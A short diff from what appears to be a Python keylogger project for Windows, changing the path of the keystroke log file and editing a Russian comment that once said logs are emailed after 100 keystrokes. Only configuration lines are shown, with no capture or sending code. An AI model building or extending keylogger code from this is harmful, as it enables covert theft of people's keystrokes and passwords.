@@ -5,8 +5,8 @@ import win32event, win32api, winerror
 
 class Keylogger:
     i = ''
-    log_path = ("C:\\Users\\vmdus\\Downloads\\klog.txt") # Указываем путь куда сохранять txt с логами
-    MAX_KEYSTROKES = 100 # Максимальное к-во символов, после него следует отправка письма
+    log_path = ("C:\\Users\\79050\\Downloads\\klog.txt") # Указываем путь куда сохранять txt с логами
+    MAX_KEYSTROKES = 100 # Максимальное к-во символов
 
 
 class myThread(threading.Thread):
